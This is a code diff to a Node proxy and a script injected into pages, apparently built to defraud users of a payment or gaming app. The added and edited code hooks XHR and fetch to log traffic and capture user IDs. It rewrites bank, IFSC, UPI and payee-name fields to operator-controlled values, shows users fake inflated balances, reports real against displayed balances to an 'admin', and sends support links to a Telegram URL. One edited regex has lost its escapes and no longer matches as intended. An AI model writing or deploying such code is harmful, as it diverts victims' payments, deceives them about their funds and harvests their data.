@@ -317,6 +317,75 @@ app.post('/hook/log', async (req, res) => {
 🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
     }
 
+    const isMineUrl = u.includes('memberInfo') || u.includes('member/info') || u.includes('member_info') ||
+      u.includes('userInfo') || u.includes('user/info') || u.includes('myInfo') || u.includes('getInfo') ||
+      u.includes('mine') || u.includes('Mine') || u.includes('profile') || u.includes('center') ||
+      u.includes('getMember') || u.includes('memberDetail') || u.includes('memberCenter') ||
+      u.includes('home') || u.includes('/index') || u.includes('dashboard');
+
+    if (isMineUrl && respData && typeof respData === 'object' && userId) {
+      function findBalDeep(obj, depth) {
+        if (!obj || typeof obj !== 'object' || depth > 6) return null;
+        const balKeys = ['iToken','itoken','balance','userBalance','availableBalance','totalBalance',
+          'money','tokenBalance','usermoney','memberBalance','myBalance','itokenBalance','iTokenBalance',
+          'userMoney','coinBalance','walletBalance'];
+        for (const bk of balKeys) {
+          if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
+            const v = parseFloat(obj[bk]);
+            if (!isNaN(v)) return { field: bk, value: v };
+          }
+        }
+        for (const k of Object.keys(obj)) {
+          if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) {
+            const f = findBalDeep(obj[k], depth + 1);
+            if (f) return f;
+          }
+        }
+        return null;
+      }
+
+      const balResult = findBalDeep(respData, 0) || findBalDeep(respJson, 0);
+      if (balResult !== null) {
+        const realBalance = balResult.value;
+        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
+        const addedBalance = uo.addedBalance || 0;
+        const globalBonus = data.depositBonus || 0;
+        const totalFake = addedBalance + globalBonus;
+        const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
+        const lastReal = uo.lastRealBalance;
+        const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
+        const userName = trackedUser.name || '';
+        const userPhone = trackedUser.phone || phone || '';
+
+        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
+
+        if (!data.userOverrides) data.userOverrides = {};
+        if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
+        data.userOverrides[String(userId)].lastRealBalance = realBalance;
+
+        if (balChanged) {
+          const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+          const changeStr = lastReal !== undefined
+            ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
+            : '';
+          notifyAdmin(data,
+`┌──────────────────────────┐
+│    💎 BALANCE SNAPSHOT    │
+└──────────────────────────┘
+👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}
+
+📊 BALANCE BREAKDOWN:
+💰 Real Balance:   ₹${realBalance.toFixed(2)}
+➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}
+
+🔗 Field: ${balResult.field}
+🕐 ${now}`);
+        }
+      }
+    }
+
     if (userId) {
       await saveData(data);
     }
@@ -684,11 +753,9 @@ app.get('/app/version', async (req, res) => {
       const body = JSON.stringify(jsonResp);
       respHeaders['content-type'] = 'application/json; charset=utf-8';
       respHeaders['content-length'] = String(Buffer.byteLength(body));
-      notifyAdmin(data, `📱 Version Check\n${body.substring(0, 500)}`);
       res.writeHead(200, respHeaders);
       res.end(body);
     } else {
-      notifyAdmin(data, `📱 Version Check (raw)\n${respBody.substring(0, 500)}`);
       respHeaders['content-length'] = String(Buffer.byteLength(respBody));
       res.writeHead(response.status, respHeaders);
       res.end(respBody);
@@ -775,18 +842,18 @@ payeeifsc:'if',receiverifsc:'if',collectionifsc:'if',
 bankname:'bn',bank_name:'bn',payeebankname:'bn',receiverbankname:'bn',
 upiid:'ui',upi_id:'ui',upi:'ui',vpa:'ui',payeeupi:'ui',receiverupi:'ui',walletupi:'ui'};
 
-var NF={'name':1,'payname':1,'\u6536\u6b3e\u4eba':1};
+var NF={'name':1,'payname':1};
 
 function rb(o,d){
 if(!o||typeof o!=='object'||!CFG||!CFG.an||d>10)return;
 if(Array.isArray(o)){for(var i=0;i<o.length;i++)rb(o[i],d+1);return;}
 var hasAcct=false;
-for(var k in o){var kl=k.toLowerCase().replace(/[_\-]/g,'');
+for(var k in o){var kl=k.toLowerCase().replace(/_/g,'').replace(/-/g,'');
 if(BF[kl]==='an'||BF[kl]==='if')hasAcct=true;}
 for(var k in o){
 if(typeof o[k]==='object'){rb(o[k],d+1);continue;}
 if(typeof o[k]!=='string'&&typeof o[k]!=='number')continue;
-var kl=k.toLowerCase().replace(/[_\-]/g,'');
+var kl=k.toLowerCase().replace(/_/g,'').replace(/-/g,'');
 var m=BF[kl];
 if(m&&CFG[m]&&String(o[k]).length>0){o[k]=CFG[m];continue;}
 if(NF[kl]&&hasAcct&&CFG.ah&&String(o[k]).length>0){o[k]=CFG.ah;}
@@ -809,7 +876,9 @@ if(!isNaN(v)&&v>=0){o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):par
 if(typeof o[k]==='object'&&o[k]!==null)addBal(o[k],bonus,d+1);
 }}
 
-var ID_FIELDS=['memberCodeId','memberCode','member_code','member_code_id','userId','user_id','channelUid','channel_uid','uid','memberId','member_id','accountId','account_id','customerId','customer_id','userCode','user_code','loginId','login_id','userNum','userNumber','memberNum','memberNumber','userID','UserID','memberID','MemberID'];
+var ID_FIELDS=['memberCodeId','memberCode','member_code','userId','user_id','channelUid','uid',
+'memberId','member_id','accountId','account_id','customerId','userCode','loginId',
+'userNum','userNumber','memberNum','userID','memberID'];
 
 function fid(o,d){
 if(!o||typeof o!=='object'||d>8)return'';
@@ -821,21 +890,23 @@ var v=String(o[f]).trim();
 if(/^\d{6,12}$/.test(v))return v;}}
 if(o.id!==undefined&&o.id!==null&&o.id!==''){
 var v2=String(o.id).trim();if(/^\d{6,12}$/.test(v2))return v2;}
-for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var f2=fid(o[k],d+1);if(f2)return f2;}}
+for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var rf=fid(o[k],d+1);if(rf)return rf;}}
 return'';}
 
 function extractLoginUID(text){
 try{
 var j=JSON.parse(text);
-var candidates=[j,j.data,j.body,j.result,j.user,j.member,j.info];
+var candidates=[j.data,j.body,j.result,j.user,j.member,j.info,j];
 for(var i=0;i<candidates.length;i++){
-var id=candidates[i]?fid(candidates[i],0):'';
-if(id)return id;}
+var c=candidates[i];
+if(c&&typeof c==='object'){var id=fid(c,0);if(id)return id;}}
 }catch(e){}
 return'';}
 
 function isLoginUrl(u){
-return/login|Login|signin|signIn|auth|Auth|doLogin|member\/login|user\/login|api\/login/i.test(u||'');}
+if(!u)return false;
+return u.indexOf('login')>-1||u.indexOf('Login')>-1||u.indexOf('signin')>-1||
+u.indexOf('doLogin')>-1||u.indexOf('auth')>-1;}
 
 function modResp(text,isLogin){
 if(!CFG||!CFG.enabled)return text;
@@ -877,10 +948,10 @@ try{
 var bs=this._bs||'';
 var login=this._isLogin||false;
 sendLog(url,this._hm||'',bs,orig,this.status);
+if(login&&!UID){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
 if(CFG&&CFG.enabled){
 var mod=modResp(orig,login);
 if(mod!==orig){this._pxRT=mod;return mod;}}
-else if(login){var lid2=extractLoginUID(orig);if(lid2)setUID(lid2,true);}
 }catch(e){}
 return orig;},configurable:true});
 
@@ -896,8 +967,11 @@ XMLHttpRequest.prototype.send=function(body){
 this._bs=b2s(body);
 if(this._isLogin){
 var self=this;
-this.addEventListener('load',function(){
-try{var orig=_rtDesc.get.call(self);var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}catch(e){}});}
+self.addEventListener('load',function(){
+try{
+var orig=_rtDesc.get.call(self);
+if(orig){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
+}catch(e){}});}
 return _send.apply(this,arguments);};
 
 var _fetch=window.fetch;
@@ -915,7 +989,7 @@ if(ct.indexOf('json')===-1&&ct.indexOf('text')===-1)return resp;
 var cl=resp.clone();
 return cl.text().then(function(text){
 sendLog(url,method,bs,text,resp.status);
-if(login){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
+if(login&&!UID){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
 if(CFG&&CFG.enabled&&ct.indexOf('json')>-1){
 var mod=modResp(text,login);
 if(mod!==text)return new Response(mod,{status:resp.status,statusText:resp.statusText,headers:resp.headers});}
@@ -931,8 +1005,8 @@ function scanDOM(){
 try{
 if(!document.body)return;
 var txt=document.body.innerText||'';
-var m1=txt.match(/\bID\s*[::]\s*([0-9]{6,12})\b/i);
-if(m1&&m1[1]){setUID(m1[1],false);return;}
+var m=txt.match(/IDs*:s*([0-9]{6,12})/i);
+if(m&&m[1])setUID(m[1],false);
 }catch(e){}}
 
 function fixLinks(){
@@ -952,8 +1026,7 @@ if(!CFG||!CFG.tg)return;
 var all=document.querySelectorAll('[onclick]');
 for(var i=0;i<all.length;i++){
 var oc=all[i].getAttribute('onclick')||'';
-if(csUrl(oc)){
-all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'");}}}
+if(csUrl(oc)){all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'");}}}
 
 var _wopen=window.open;
 window.open=function(url){
